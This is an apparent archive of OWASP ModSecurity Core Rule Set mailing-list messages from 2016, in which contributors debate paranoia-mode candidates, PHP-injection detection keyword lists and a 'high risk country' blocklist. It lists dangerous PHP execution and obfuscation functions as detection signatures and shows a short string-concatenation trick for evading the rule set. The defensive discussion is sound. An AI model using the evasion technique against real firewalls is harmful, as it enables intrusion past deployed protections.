> >> > >terms with relatively low attacker interest, like assert, to the
> >>paranoid
> >> > >list. But, in any case they should become more robust regexps like
> >> > >?\bfile\s*(?.
> >> > >
> >> > >3) Separate the data file. Start with a small
> >> > >?php-commands-critical.data? list. This should contain the usual
> >>suspects
> >> > >used for:
> >> > >- obfuscation: base64_decode, gzdecode, etc...
> >> > >- execution: passthru, proc_open, shell_exec, call_user_func,
> >> > >require_once, include_once...
> >> > >- IO: file_get_contents, file_put_contents, fopen, fwrite...
> >> > >- environment inspection and setting: error_reporting,
> >>function_exists,
> >> > >ini_set, auto_prepend_file, sys_get_temp_dir...
> >> > >
> >> > >If any of those strings is present, it?s certainly an attack, except
> >>for
> >> > >that single person who runs a PHP-related wiki. The list should only
> >> > >contain the real red flags, don?t try to cleverly prevent FP using
> >> > >complex regexps, and cannot contain any common English words (so
> >> > >unfortunately ?require? and ?include? are off limits...)
> >> > >
> >> > >4) Other functions could go in ?php-commands-functions.data?. This
> >>list
> >> > >would be small and contain only *proper functions* having PHP syntax
> >> > >?function()? and have names often used in natural text. To prevent
> >>FP we
> >> > >look for the parenthesis. Let?s take example ?system?, this is often
> >> > >found in natural text, but an attacker wants to do ?system(? so they
> >>need
> >> > >parentheses and a word boundary at the start. So a regexp might look
> >>like
> >> > >"\bsystem\s*\(?. Because we have the regexp, FP is lowered. It would
> >> > >still match stuff like ?F*ck the system (yeah yeah)?
> >> > >
> >> > >5) Other PHP related terms could stay in ?php-commands-common.data?.
> >>This
> >> > >would list the PHP commands and terms of lesser interest.
> >> > >
> >> > >6) We?ll have to review if there are terms which are so common in
> >>natural
> >> > >text that they?ll have to be moved to ?php-commands-paranoid.data?. I
> >> > >think this list might be as small as possible. Maybe stuff like ?dl?,
> >> > >?require?, ?include?. It?s still likely to produce FP...
> >> > >
> >> > >7) String matching for PHP functions is not powerful enough. We need
> >> > >generic rules that prevent PHP evasion. I don?t remember seeing this
> >>in
> >> > >the wild, but an easy way to evade textual signature matches would
> >>be PHP
> >> > >variable functions
> >> >
> >>>(http://scanmail.trustwave.com/?c=4062&d=7tO31v4ao2_NNeZ84J8wNSWydu00_AA
> >>>Pk
> >> >
> >>>vCjeQMDpQ&s=5&u=http%3a%2f%2fphp%2enet%2fmanual%2fen%2ffunctions%2evaria
> >>>bl
> >> > >e-functions%2ephp%29 For instance, you can do the following to get
> >>around
> >> > >the CRS:
> >> > >
> >> > >$aB_4c = 'fil' . 'e_get' . '_contents';
> >> > >$aB_4c('...');
> >> > >
> >> > >So we want a generic signature to detect variable function call
> >>syntax.
> >> > >Fortunately its syntax is very uncommon in natural text, so I?d
> >>advocate
> >> > >putting this rule in normal mode.
> >> > >
> >> > >Anyway my ?0.02 or maybe a bit more :)
> >> > >
> >> > >
> >> > >_______________________________________________
> >> > >Owasp-modsecurity-core-rule-set mailing list
> >> > >Owasp-modsecurity-core-rule-set at lists.owasp.org
> >> >
> >>>http://scanmail.trustwave.com/?c=4062&d=7tO31v4ao2_NNeZ84J8wNSWydu00_AAP
> >>>kq
> >> >
> >>>emcgoEpA&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2f
> >>>ow
> >> > >asp-modsecurity-core-rule-set
> >> >
> >> >
> >> > ________________________________
> >> >
> >> > This transmission may contain information that is privileged,
> >>confidential, and/or exempt from disclosure under applicable law. If you
> >>are not the intended recipient, you are hereby notified that any
> >>disclosure, copying, distribution, or use of the information contained
> >>herein (including any reliance thereon) is strictly prohibited. If you
> >>received this transmission in error, please immediately contact the
> >>sender and destroy the material in its entirety, whether in electronic
> >>or hard copy format.
> >> > _______________________________________________
> >> > Owasp-modsecurity-core-rule-set mailing list
> >> > Owasp-modsecurity-core-rule-set at lists.owasp.org
> >> >
> >>http://scanmail.trustwave.com/?c=4062&d=zdK-1lANbYH0zbTgGyqCcBKbND23Kjo7G
> >>5xS4hMPhQ&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2f
> >>owasp-modsecurity-core-rule-set
> >>
> >> --
> >> mailto:christian.folini at netnea.com
> >>
> >>http://scanmail.trustwave.com/?c=4062&d=zdK-1lANbYH0zbTgGyqCcBKbND23Kjo7G
> >>5kHvhVUiA&s=5&u=http%3a%2f%2fwww%2echristian-folini%2ech
> >> twitter: @ChrFolini
> >> _______________________________________________
> >> Owasp-modsecurity-core-rule-set mailing list
> >> Owasp-modsecurity-core-rule-set at lists.owasp.org
> >>
> >>http://scanmail.trustwave.com/?c=4062&d=zdK-1lANbYH0zbTgGyqCcBKbND23Kjo7G
> >>5xS4hMPhQ&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2f
> >>owasp-modsecurity-core-rule-set
> >
> >--
> >mailto:christian.folini at netnea.com
> >http://scanmail.trustwave.com/?c=4062&d=zdK-1lANbYH0zbTgGyqCcBKbND23Kjo7G5
> >kHvhVUiA&s=5&u=http%3a%2f%2fwww%2echristian-folini%2ech
> >twitter: @ChrFolini
> >_______________________________________________
> >Owasp-modsecurity-core-rule-set mailing list
> >Owasp-modsecurity-core-rule-set at lists.owasp.org
> >http://scanmail.trustwave.com/?c=4062&d=zdK-1lANbYH0zbTgGyqCcBKbND23Kjo7G5
> >xS4hMPhQ&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fow
> >asp-modsecurity-core-rule-set
> 
> 
> ________________________________
> 
> This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set

From christian.folini at netnea.com  Mon Feb 15 20:11:08 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Mon, 15 Feb 2016 21:11:08 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 970901 / 950100 (Application returning 500)
In-Reply-To: <D2E6BB0B.1A475%csanders@trustwave.com>
References: <20160202084457.GE29931@elias> <20160212212239.GD32631@elias>
	<D2E6BB0B.1A475%csanders@trustwave.com>
Message-ID: <20160215201108.GB4580@elias>

On Mon, Feb 15, 2016 at 04:16:51AM +0000, Chaim Sanders wrote:
> Honestly I am fine either way. It isn?t really a ?paranoid? issue it is
> more of an issue with modsecurity understanding. Perhaps another reason
> why paranoid is a bad name :-p. I do think based on this convo that moving
> it to paranoid doesn?t hurt.

Thanks Chaim. 

I still think paranoid is a good name. But I have not
forgotten the need to discuss in detail it before a final release.

Ahoj,

Christian



> 
> On 2/12/16, 4:22 PM,
> "owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
> Christian Folini" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
> on behalf of christian.folini at netnea.com> wrote:
> 
> >Hello,
> >
> >There has not been much of a discussion here. Thinking this over once or
> >twice again, I think the idea of the paranoia mode is to make things
> >easier for the inexperienced admin.
> >
> >In this light, I think it is best to move this rule to paranoia mode.
> >This will allow for easier blind sqli attacks, but it does not cloak
> >a backend error with a 403.
> >
> >Unless somebody objects with new arguments of course. If you do object,
> >please move quickly now.
> >
> >Best,
> >
> >Christian
> >
> >
> >
> >On Tue, Feb 02, 2016 at 09:44:57AM +0100, Christian Folini wrote:
> >> Hi!
> >>
> >> This is a juicy one.
> >>
> >> Rule in 2.2.9:
> >> SecRule RESPONSE_STATUS "^5\d{2}$"
> >>"phase:4,rev:'2',ver:'OWASP_CRS/2.2.9',maturity:'9',accuracy:'9',t:none,c
> >>apture,ctl:auditLogParts=+E,block,msg:'The application is not
> >>available',logdata:'Matched Data: %{TX.0} found within
> >>%{MATCHED_VAR_NAME}:
> >>%{MATCHED_VAR}',id:'970901',tag:'WASCTC/WASC-13',tag:'OWASP_TOP_10/A6',ta
> >>g:'PCI/6.5.6',severity:'3',setvar:'tx.msg=%{rule.msg}',setvar:tx.outbound
> >>_anomaly_score=+%{tx.error_anomaly_score},setvar:tx.anomaly_score=+%{tx.e
> >>rror_anomaly_score},setvar:tx.%{rule.id}-AVAILABILITY/APP_NOT_AVAIL-%{mat
> >>ched_var_name}=%{tx.0}"
> >>
> >> Rule in 3.0.0rc1:
> >> SecRule RESPONSE_STATUS "^5\d{2}$" \
> >>      "phase:response,\
> >>      rev:'3',\
> >>      ver:'OWASP_CRS/3.0.0',\
> >>      maturity:'9',\
> >>      accuracy:'9',\
> >>      t:none,\
> >>      capture,\
> >>      ctl:auditLogParts=+E,\
> >>      block,\
> >>      msg:'The Application Returned a 500-Level Status Code',\
> >>      logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}:
> >>%{MATCHED_VAR}',\
> >>      id:'950100',\
> >>      tag:'application-multi',\
> >>      tag:'language-multi',\
> >>      tag:'platform-multi',\
> >>      tag:'attack-information disclosure',\
> >>      tag:'WASCTC/WASC-13',\
> >>      tag:'OWASP_TOP_10/A6',\
> >>      tag:'PCI/6.5.6',\
> >>      severity:'ERROR',\
> >>      setvar:'tx.msg=%{rule.msg}',\
> >>      setvar:tx.outbound_anomaly_score=+%{tx.error_anomaly_score},\
> >>      setvar:tx.anomaly_score=+%{tx.error_anomaly_score},\
> >>
> >>      setvar:tx.%{rule.id}-AVAILABILITY/APP_NOT_AVAIL-%{matched_var_name}=%{tx
> >>.0}"
> >>
> >> Obviously we check the HTTP response status code and trigger an alert
> >>on
> >> a status 500. It is one of the rare rules with anomaly score error (=4)
> >> as opposed to critical (=5).
> >>
> >> Franziska thinks this is too generic and cloaks backend misbehaviour.
> >> (If you have a problem with the error page, then replace it!), but let's
> >> not hide the fact of the error from the client.
> >>
> >> Now Walter thinks this rule plays a role when defending against blind
> >> attacks where the difference between 403 (likely blocked by
> >>ModSecurity)
> >> and 500 (passed ModSecurity, but crashed on backend) gives an attacker
> >> important information.
> >>
> >> Initially, I wanted to push this rule into paranoia mode. But now I am
> >> not so sure anymore for Walter does have a point.
> >>
> >> However, the inexperienced administrator could have a hard time
> >> indentifying the 403 status as a backend failure. So maybe it is still
> >> a paranoia candidate despite it's supportive role when defending against
> >> blind injection attacks.
> >>
> >> More brain cycles are definitely needed here!
> >>
> >> Christian
> >>
> >>
> >> --
> >> mailto:christian.folini at netnea.com
> >>
> >>http://scanmail.trustwave.com/?c=4062&d=gdO-1gRxIDHovuaeslSrBCHmlII0ZDH7c
> >>U_5KX4pjQ&s=5&u=http%3a%2f%2fwww%2echristian-folini%2ech
> >> twitter: @ChrFolini
> >> _______________________________________________
> >> Owasp-modsecurity-core-rule-set mailing list
> >> Owasp-modsecurity-core-rule-set at lists.owasp.org
> >>
> >>http://scanmail.trustwave.com/?c=4062&d=gdO-1gRxIDHovuaeslSrBCHmlII0ZDH7c
> >>UqsdXhygA&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2f
> >>owasp-modsecurity-core-rule-set
> >
> >--
> >mailto:christian.folini at netnea.com
> >http://scanmail.trustwave.com/?c=4062&d=gdO-1gRxIDHovuaeslSrBCHmlII0ZDH7cU
> >_5KX4pjQ&s=5&u=http%3a%2f%2fwww%2echristian-folini%2ech
> >twitter: @ChrFolini
> >_______________________________________________
> >Owasp-modsecurity-core-rule-set mailing list
> >Owasp-modsecurity-core-rule-set at lists.owasp.org
> >http://scanmail.trustwave.com/?c=4062&d=gdO-1gRxIDHovuaeslSrBCHmlII0ZDH7cU
> >qsdXhygA&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fow
> >asp-modsecurity-core-rule-set
> 
> 
> ________________________________
> 
> This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

-- 
mailto:christian.folini at netnea.com
http://www.christian-folini.ch
twitter: @ChrFolini

From christian.folini at netnea.com  Mon Feb 15 20:17:35 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Mon, 15 Feb 2016 21:17:35 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten
 controversial candidate 900050 / 910100 (Client IP is from a HIGH Risk
 Country Location)
In-Reply-To: <D2E6BBB0.1A479%csanders@trustwave.com>
References: <20160213053026.GA9613@elias>
	<D2E6BBB0.1A479%csanders@trustwave.com>
Message-ID: <20160215201735.GC4580@elias>

Chaim,

I see you and Walter agreeing on the idea to keep the rule around
in standard mode. I would probably still comment out the default
country list - but that's a different question.

I've removed the rule from the list of paranoia candidates.

Btw: The country list involves China, but the documentation does not
name China (but all the other countried).

Cheers,

Christian


On Mon, Feb 15, 2016 at 04:19:44AM +0000, Chaim Sanders wrote:
> In general I like to assume that if people are going to get caught by
> something blocking unintentionally it will be a configuration from the
> configuration file, as they are supposed to be reading those :-). I
> honestly haven?t heard many complaints about this feature and as a result
> I?d probably leave it enabled as it as sad as it is, is fairly effective.
> 
> On 2/13/16, 12:30 AM,
> "owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
> Christian Folini" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
> on behalf of christian.folini at netnea.com> wrote:
> 
> >Hi there,
> >
> >It seems I overlooked this candidate, where Franziska said she is unsure
> >whether we should blog certain countries in a default installation or
> >not.
> >
> >The rule does:
> >  SecRule GEO:COUNTRY_CODE "@pm %{tx.high_risk_country_codes}"
> >
> >With tx.high_risk_country_codes being set to
> >"UA ID YU LT EG RO BG TR RU PK MY CN"
> >in modsecurity_crs_10_setup.conf.example.
> >
> >Depending on your location, requests from the given set of
> >countried may be desired and not potential attacks. So I think
> >Franziska has a point.
> >
> >One resolution would be to leave the rule where it is, but comment
> >out the definition of the variable in
> >modsecurity_crs_10_setup.conf.example
> >and provide multiple default variants in the comments.
> >That could also be performed in combination with the move to
> >the paranoia mode.
> >
> >Opinions?
> >
> >Christian
> >
> >
> >--
> >The problem is, if you're not a hacker,
> >you can't tell who the good hackers are.
> >--- Paul Graham
> >_______________________________________________
> >Owasp-modsecurity-core-rule-set mailing list
> >Owasp-modsecurity-core-rule-set at lists.owasp.org
> >http://scanmail.trustwave.com/?c=4062&d=5sS-1i1jGNzLWl4_4Oku6bhM-zSgEVOp-i
> >xlzEmHDg&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fow
> >asp-modsecurity-core-rule-set
> 
> 
> ________________________________
> 
> This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

-- 
mailto:christian.folini at netnea.com
http://www.christian-folini.ch
twitter: @ChrFolini

From iulian at sphere.ro  Mon Feb 15 20:55:31 2016
From: iulian at sphere.ro (iulian at sphere.ro)
Date: Mon, 15 Feb 2016 22:55:31 +0200
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten
	controversial candidate 900050 / 910100 (Client IP is from a
	HIGH Risk Country Location)
In-Reply-To: <20160215201735.GC4580@elias>
References: <20160213053026.GA9613@elias>
	<D2E6BBB0.1A479%csanders@trustwave.com>
	<20160215201735.GC4580@elias>
Message-ID: <D02A40E4-2AB0-487A-BA1A-FCF5D754482D@sphere.ro>

Dears, 

I am just wondering on what basis you are considering these countries to be potentially risky? 

Even if those are risky simply putting these on default will be a mistake.
Most people don't read the configuration file or don't fully understand every feature and just stick with the default configuration.

If you want advanced protection then you are forced to make changes or even make your own rules.

Best regards,
Iulian



On February 15, 2016 10:17:35 PM GMT+02:00, Christian Folini <christian.folini at netnea.com> wrote:
>Chaim,
>
>I see you and Walter agreeing on the idea to keep the rule around
>in standard mode. I would probably still comment out the default
>country list - but that's a different question.
>
>I've removed the rule from the list of paranoia candidates.
>
>Btw: The country list involves China, but the documentation does not
>name China (but all the other countried).
>
>Cheers,
>
>Christian
>
>
>On Mon, Feb 15, 2016 at 04:19:44AM +0000, Chaim Sanders wrote:
>> In general I like to assume that if people are going to get caught by
>> something blocking unintentionally it will be a configuration from
>the
>> configuration file, as they are supposed to be reading those :-). I
>> honestly haven?t heard many complaints about this feature and as a
>result
>> I?d probably leave it enabled as it as sad as it is, is fairly
>effective.
>> 
>> On 2/13/16, 12:30 AM,
>> "owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
>> Christian Folini"
><owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
>> on behalf of christian.folini at netnea.com> wrote:
>> 
>> >Hi there,
>> >
>> >It seems I overlooked this candidate, where Franziska said she is
>unsure
>> >whether we should blog certain countries in a default installation
>or
>> >not.
>> >
>> >The rule does:
>> >  SecRule GEO:COUNTRY_CODE "@pm %{tx.high_risk_country_codes}"
>> >
>> >With tx.high_risk_country_codes being set to
>> >"UA ID YU LT EG RO BG TR RU PK MY CN"
>> >in modsecurity_crs_10_setup.conf.example.
>> >
>> >Depending on your location, requests from the given set of
>> >countried may be desired and not potential attacks. So I think
>> >Franziska has a point.
>> >
>> >One resolution would be to leave the rule where it is, but comment
>> >out the definition of the variable in
>> >modsecurity_crs_10_setup.conf.example
>> >and provide multiple default variants in the comments.
>> >That could also be performed in combination with the move to
>> >the paranoia mode.
>> >
>> >Opinions?
>> >
>> >Christian
>> >
>> >
>> >--
>> >The problem is, if you're not a hacker,
>> >you can't tell who the good hackers are.
>> >--- Paul Graham
>> >_______________________________________________
>> >Owasp-modsecurity-core-rule-set mailing list
>> >Owasp-modsecurity-core-rule-set at lists.owasp.org
>>
>>http://scanmail.trustwave.com/?c=4062&d=5sS-1i1jGNzLWl4_4Oku6bhM-zSgEVOp-i
>>
>>xlzEmHDg&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fow
>> >asp-modsecurity-core-rule-set
>> 
>> 
>> ________________________________
>> 
>> This transmission may contain information that is privileged,
>confidential, and/or exempt from disclosure under applicable law. If
>you are not the intended recipient, you are hereby notified that any
>disclosure, copying, distribution, or use of the information contained
>herein (including any reliance thereon) is strictly prohibited. If you
>received this transmission in error, please immediately contact the
>sender and destroy the material in its entirety, whether in electronic
>or hard copy format.
>
>-- 
>mailto:christian.folini at netnea.com
>http://www.christian-folini.ch
>twitter: @ChrFolini
>_______________________________________________
>Owasp-modsecurity-core-rule-set mailing list
>Owasp-modsecurity-core-rule-set at lists.owasp.org
>https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set

-- 
Sent from my Android device with K-9 Mail. Please excuse my brevity.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160215/0305d9ae/attachment.html>

From modsec at spam.lifeforms.nl  Mon Feb 15 21:56:10 2016
From: modsec at spam.lifeforms.nl (Walter Hop)
Date: Mon, 15 Feb 2016 22:56:10 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten
	controversial candidate 900050 / 910100 (Client IP is from a
	HIGH Risk Country Location)
In-Reply-To: <D02A40E4-2AB0-487A-BA1A-FCF5D754482D@sphere.ro>
References: <20160213053026.GA9613@elias>
	<D2E6BBB0.1A479%csanders@trustwave.com>
	<20160215201735.GC4580@elias>
	<D02A40E4-2AB0-487A-BA1A-FCF5D754482D@sphere.ro>
Message-ID: <79E82706-4383-4BB3-BD39-7FB9281B9B3E@spam.lifeforms.nl>

I think the source is an article from 2003, which explains why Yugoslavia is in the list:
http://citeseerx.ist.psu.edu/viewdoc/download;jsessionid=2A684B6B2B6E99D03F578D3296E05483?doi=10.1.1.198.9996&rep=rep1&type=pdf

(Just to correct, I didn?t want to keep the rule enabled by default, but instead I?d rather comment it as an example.)


> On 15 Feb 2016, at 21:55, iulian at sphere.ro wrote:
> 
> Dears, 
> 
> I am just wondering on what basis you are considering these countries to be potentially risky? 
> 
> Even if those are risky simply putting these on default will be a mistake.
> Most people don't read the configuration file or don't fully understand every feature and just stick with the default configuration.
> 
> If you want advanced protection then you are forced to make changes or even make your own rules.
> 
> Best regards,
> Iulian
> 
> 
> 
> On February 15, 2016 10:17:35 PM GMT+02:00, Christian Folini <christian.folini at netnea.com> wrote:
> Chaim,
> 
> I see you and Walter agreeing on the idea to keep the rule around
> in standard mode. I would probably still comment out the default
> country list - but that's a different question.
> 
> I've removed the rule from the list of paranoia candidates.
> 
> Btw: The country list involves China, but the documentation does not
> name China (but all the other countried).
> 
> Cheers,
> 
> Christian
> 
> 
> On Mon, Feb 15, 2016 at 04:19:44AM +0000, Chaim Sanders wrote:
>  In general I like to assume that if people are going to get caught by
>  something blocking unintentionally it will be a configuration from the
>  configuration file, as they are supposed to be reading those :-). I
>  honestly haven?t heard many complaints about this feature and as a result
>  I?d probably
>   leave
> it enabled as it as sad as it is, is fairly effective.
>  
>  On 2/13/16, 12:30 AM,
>  "owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
>  Christian Folini" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
>  on behalf of christian.folini at netnea.com> wrote:
>  
> Hi there,
> 
> It seems I overlooked this candidate, where Franziska said she is unsure
> whether we should blog certain countries in a default installation or
> not.
> 
> The rule does:
>   SecRule GEO:COUNTRY_CODE "@pm %{tx.high_risk_country_codes}"
> 
> With tx.high_risk_country_codes being set to
> "UA ID YU LT EG RO BG TR RU PK MY CN"
> in modsecurity_crs_10_setup.conf.example.
> 
> Depending on your location, requests from the given set of
> countried may be desired and not potential attacks. So I t
>  hink
> Franziska has a point.
> 
> One resolution would be to leave the rule where it is, but comment
> out the definition of the variable in
> modsecurity_crs_10_setup.conf.example
> and provide multiple default variants in the comments.
> That could also be performed in combination with the move to
> the paranoia mode.
> 
> Opinions?
> 
> Christian
> 
> 
> --
> The problem is, if you're not a hacker,
> you can't tell who the good hackers are.
> --- Paul Graham
> 
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> http://scanmail.trustwave.com/?c=4062&d=5sS-1i1jGNzLWl4_4Oku6bhM-zSgEVOp-i <http://scanmail.trustwave.com/?c=4062&d=5sS-1i1jGNzLWl4_4Oku6bhM-zSgEVOp-i>
> xlzEmHDg&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fow
> asp-modsecurity-core-rule-set
>  
>  
> 
>  
>  This trans
>  mission
> may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
> 
> -- 
> Sent from my Android device with K-9 Mail. Please excuse my brevity.
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set

-- 
Walter Hop | PGP key: https://lifeforms.nl/pgp

-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160215/d7cdd992/attachment.html>

From ryan.barnett at owasp.org  Mon Feb 15 23:14:39 2016
From: ryan.barnett at owasp.org (Ryan Barnett)
Date: Mon, 15 Feb 2016 18:14:39 -0500
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten
 controversial candidate 900050 / 910100 (Client IP is from a HIGH Risk
 Country Location)
In-Reply-To: <79E82706-4383-4BB3-BD39-7FB9281B9B3E@spam.lifeforms.nl>
References: <20160213053026.GA9613@elias>
	<D2E6BBB0.1A479%csanders@trustwave.com>
	<20160215201735.GC4580@elias>
	<D02A40E4-2AB0-487A-BA1A-FCF5D754482D@sphere.ro>
	<79E82706-4383-4BB3-BD39-7FB9281B9B3E@spam.lifeforms.nl>
Message-ID: <30E1AC04-CB5F-4FE4-AECA-B514C7ED342E@owasp.org>

Correct.  At the time we created those rules, that was the paper we were referencing.  High fraud countries can be flagged globally however this is highly dependent upon the web site?s geo location and their legit user base location.

From:  <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org> on behalf of Walter Hop <modsec at spam.lifeforms.nl>
Date:  Monday, February 15, 2016 at 4:56 PM
To:  "owasp-modsecurity-core-rule-set at lists.owasp.org" <owasp-modsecurity-core-rule-set at lists.owasp.org>
Subject:  Re: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten controversial candidate 900050 / 910100 (Client IP is from a HIGH Risk Country Location)

I think the source is an article from 2003, which explains why Yugoslavia is in the list:
http://citeseerx.ist.psu.edu/viewdoc/download;jsessionid=2A684B6B2B6E99D03F578D3296E05483?doi=10.1.1.198.9996&rep=rep1&type=pdf

(Just to correct, I didn?t want to keep the rule enabled by default, but instead I?d rather comment it as an example.)


On 15 Feb 2016, at 21:55, iulian at sphere.ro wrote:

Dears, 

I am just wondering on what basis you are considering these countries to be potentially risky? 

Even if those are risky simply putting these on default will be a mistake.
Most people don't read the configuration file or don't fully understand every feature and just stick with the default configuration.

If you want advanced protection then you are forced to make changes or even make your own rules.

Best regards,
Iulian



On February 15, 2016 10:17:35 PM GMT+02:00, Christian Folini <christian.folini at netnea.com> wrote:
Chaim,

I see you and Walter agreeing on the idea to keep the rule around
in standard mode. I would probably still comment out the default
country list - but that's a different question.

I've removed the rule from the list of paranoia candidates.

Btw: The country list involves China, but the documentation does not
name China (but all the other countried).

Cheers,

Christian


On Mon, Feb 15, 2016 at 04:19:44AM +0000, Chaim Sanders wrote:
 In general I like to assume that if people are going to get caught by
 something blocking unintentionally it will be a configuration from the
 configuration file, as they are supposed to be reading those :-). I
 honestly haven?t heard many complaints about this feature and as a result
 I?d probably
  leave
it enabled as it as sad as it is, is fairly effective.
 
 On 2/13/16, 12:30 AM,
 "owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
 Christian Folini" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
 on behalf of christian.folini at netnea.com> wrote:
 
Hi there,

It seems I overlooked this candidate, where Franziska said she is unsure
whether we should blog certain countries in a default installation or
not.

The rule does:
  SecRule GEO:COUNTRY_CODE "@pm %{tx.high_risk_country_codes}"

With tx.high_risk_country_codes being set to
"UA ID YU LT EG RO BG TR RU PK MY CN"
in modsecurity_crs_10_setup.conf.example.

Depending on your location, requests from the given set of
countried may be desired and not potential attacks. So I t
 hink
Franziska has a point.

One resolution would be to leave the rule where it is, but comment
out the definition of the variable in
modsecurity_crs_10_setup.conf.example
and provide multiple default variants in the comments.
That could also be performed in combination with the move to
the paranoia mode.

Opinions?

Christian


--
The problem is, if you're not a hacker,
you can't tell who the good hackers are.
--- Paul Graham

Owasp-modsecurity-core-rule-set mailing list
Owasp-modsecurity-core-rule-set at lists.owasp.org
http://scanmail.trustwave.com/?c=4062&d=5sS-1i1jGNzLWl4_4Oku6bhM-zSgEVOp-i
xlzEmHDg&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fow
asp-modsecurity-core-rule-set
 
 

 
 This trans
 mission
may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

-- 
Sent from my Android device with K-9 Mail. Please excuse my brevity.
_______________________________________________
Owasp-modsecurity-core-rule-set mailing list
Owasp-modsecurity-core-rule-set at lists.owasp.org
https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set

-- 
Walter Hop | PGP key: https://lifeforms.nl/pgp

_______________________________________________ Owasp-modsecurity-core-rule-set mailing list Owasp-modsecurity-core-rule-set at lists.owasp.org https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set 
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160215/f4a0b607/attachment-0001.html>

From ryan.barnett at owasp.org  Mon Feb 15 23:19:53 2016
From: ryan.barnett at owasp.org (Ryan Barnett)
Date: Mon, 15 Feb 2016 18:19:53 -0500
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten
 controversial candidate 900050 / 910100 (Client IP is from a HIGH Risk
 Country Location)
In-Reply-To: <20160215201735.GC4580@elias>
References: <20160213053026.GA9613@elias>
	<D2E6BBB0.1A479%csanders@trustwave.com>
	<20160215201735.GC4580@elias>
Message-ID: <0B291D6A-1901-4A04-A53C-99628DC6267B@owasp.org>

A couple comments -
I am ecstatic to see all of the community feedback and participation.  This is how I always envisioned it working.  ModSecurity, and the OWASP CRS. Are community projects.  They will live/die by community involvement.
I regards to these settings ? it is purely semantics but I would recommend s/paranoid/aggressive/g.   The former has a negative connotation to it while the later seems more even handed.   The point is that these rule can provide some level of value however it is at the expense of False Positives.
-Ryan

From:  <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org> on behalf of Christian Folini <christian.folini at netnea.com>
Date:  Monday, February 15, 2016 at 3:17 PM
To:  Chaim Sanders <CSanders at trustwave.com>
Cc:  "owasp-modsecurity-core-rule-set at lists.owasp.org" <owasp-modsecurity-core-rule-set at lists.owasp.org>
